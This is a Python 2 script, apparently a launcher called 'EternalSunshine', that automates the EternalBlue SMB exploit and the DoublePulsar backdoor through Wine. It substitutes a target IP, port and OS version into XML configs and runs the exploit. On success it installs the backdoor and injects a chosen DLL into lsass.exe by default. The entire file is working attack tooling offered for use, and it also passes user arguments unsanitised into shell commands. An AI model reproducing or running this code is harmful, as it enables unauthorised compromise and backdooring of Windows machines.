import os
import commands

from blessings import Terminal
term = Terminal()

import argparse
argument_parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)

eternalblue_skeleton = "Eternalblue-2.2.0.Skeleton.xml"
eternalblue_config = "Eternalblue-2.2.0.xml"
eternalblue_exe = "Eternalblue-2.2.0.exe"

doublepulsar_skeleton = "Doublepulsar-1.3.1.Skeleton.xml"
doublepulsar_config = "Doublepulsar-1.3.1.xml"
doublepulsar_exe = "Doublepulsar-1.3.1.exe"

quote = "'"
space = " "
direct = " > "

dll = rhost = rport = timeout = arch = target = process = ""

def getArguments():
	global dll,rhost,rport,timeout,arch,version,process
	argument_parser.add_argument("-A","--arch",type=str,help="Target host architecture  x64|x86",required=True)
	argument_parser.add_argument("-V","--version",type=str,help="Target host os version  XP|WIN72K8R2", required=True)
	argument_parser.add_argument("-H","--host",type=str,help="Target host ip address",required=True)
	argument_parser.add_argument("-P","--port",type=str,help="Target host port",default="445")
	argument_parser.add_argument("-T","--timeout",type=str,help="Timeout",default="20")
	argument_parser.add_argument("-D","--dll",type=str,help="Dll payload path",required=True)
	argument_parser.add_argument("--process",type=str,help="Name of process to inject into",default="lsass.exe")
	
	args = argument_parser.parse_args()
	arch = args.arch
	target = args.version
	rhost = args.host
	rport = args.port
	timeout = args.timeout
	dll = args.dll
	process = args.process

def banner():
	from pyfiglet import Figlet
	f = Figlet(font="slant")
	print term.bold_yellow(f.renderText("EternalSunshine"))

def print_info():
	print term.bold_yellow("[RHOST]: ")+rhost
	print term.bold_yellow("[RPORT]: ")+rport
	print term.bold_yellow("[TIMEOUT]: ")+timeout
	print term.bold_yellow("[ARCH]: ")+arch
	print term.bold_yellow("[TARGET]: ")+target
	print term.bold_yellow("[PROCESS]: ")+process
	print term.bold_yellow("[DLL]: ")+dll
	print "----------------------------------------------------"


def generate_eternalblue_config():
	command = "rm -rf " + eternalblue_config
	os.system(command)
	command = "sed " + quote + "s/%RHOST%/" + rhost + "/" + quote + space + eternalblue_skeleton + direct + eternalblue_config 
	os.system(command)
	command = "sed " + quote + "s/%RPORT%/" + rport + "/" + quote + space + "-i " + eternalblue_config 
	os.system(command)
	command = "sed " + quote + "s/%TIMEOUT%/" + timeout + "/" + quote + space + "-i " + eternalblue_config
	os.system(command)
	command = "sed " + quote + "s/%TARGET%/" + target + "/" + quote + space + "-i " + eternalblue_config 
	os.system(command)

def generate_doublepulsar_config():
	command = "rm -rf " + doublepulsar_config
	os.system(command)
	command = "sed " + quote + "s/%RHOST%/" + rhost + "/" + quote + space + doublepulsar_skeleton + direct + doublepulsar_config
	os.system(command)
	command = "sed " + quote + "s/%RPORT%/" + rport + "/" + quote + space + "-i " + doublepulsar_config 
	os.system(command)
	command = "sed " + quote + "s/%TIMEOUT%/" + timeout + "/" + quote + space + "-i " + doublepulsar_config
	os.system(command)
	command = "sed " + quote + "s/%PROCESSINJECT%/" + process + "/" + quote + space + "-i " + doublepulsar_config 
	os.system(command)
	command = "sed " + quote + "s/%TARGETARCHITECTURE%/" + arch + "/" + quote + space + "-i " + doublepulsar_config 
	os.system(command)
	command = "sed " + quote + "s/%DLLPAY%/" + dll + "/" + quote + space + "-i " + doublepulsar_config 
	os.system(command)


def run_eternalblue():
	command = "wine "  + eternalblue_exe
	ret = commands.getstatusoutput(command)
	output = ret[1]
	success = "-=-WIN-="
	backdoor = "Backdoor is already installed"

	if success in output:
		print term.bold_green("[+] " + "Exploitation successful")
		return True
	elif backdoor in output:
		print term.bold_green("[+] " + backdoor)
		return True
	else:
		print term.bold_red("[-] " +"Exploitation failed")
		return False

def run_doublepulsar():
	command = "wine "  + doublepulsar_exe
	ret = commands.getstatusoutput(command)
	output = ret[1]
	success = "Backdoor returned code: 10 - Success!"
	if success in output:
		print term.bold_green("[+] " + "Backdoor installed successfuly")
		return True
	else:
		print term.bold_red("[-] " + "Backdoor installation failed")
		return False



def main():
	banner()
	getArguments()
	print_info()
	print term.bold_yellow("[!] Starting EternalBlue")
	eternalblue = run_eternalblue()
	if eternalblue:
		print term.bold_yellow("[!] Running DoublePulsar")
		doublepulsar = run_doublepulsar()
		if doublepulsar:
			print term.bold_green("[+] You can connect with " + dll)


main()
